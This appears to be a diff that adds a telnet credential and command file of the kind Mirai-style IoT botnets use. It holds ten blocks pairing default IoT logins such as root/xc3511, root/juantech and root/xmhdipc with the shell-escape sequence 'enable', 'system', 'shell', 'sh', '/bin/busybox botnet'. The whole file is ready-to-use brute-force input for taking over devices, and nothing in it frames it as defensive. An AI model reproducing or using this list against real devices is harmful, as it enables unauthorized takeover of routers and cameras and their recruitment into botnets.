@@ -1,0 +1,80 @@
+root
+
+12345
+enable
+system
+shell
+sh
+/bin/busybox botnet
+guest
+
+12345
+enable
+system
+shell
+sh
+/bin/busybox botnet
+admin
+
+admin1234
+enable
+system
+shell
+sh
+/bin/busybox botnet
+root
+
+juantech
+enable
+system
+shell
+sh
+/bin/busybox botnet
+root
+
+xmhdipc
+enable
+system
+shell
+sh
+/bin/busybox botnet
+ubnt
+
+ubnt
+enable
+system
+shell
+sh
+/bin/busybox botnet
+admin
+
+smcadmin
+enable
+system
+shell
+sh
+/bin/busybox botnet
+root
+
+xc3511
+enable
+system
+shell
+sh
+/bin/busybox botnet
+root
+
+root
+enable
+system
+shell
+sh
+/bin/busybox botnet
+root
+
+xc3511
+enable
+system
+shell
+sh
+/bin/busybox botnet
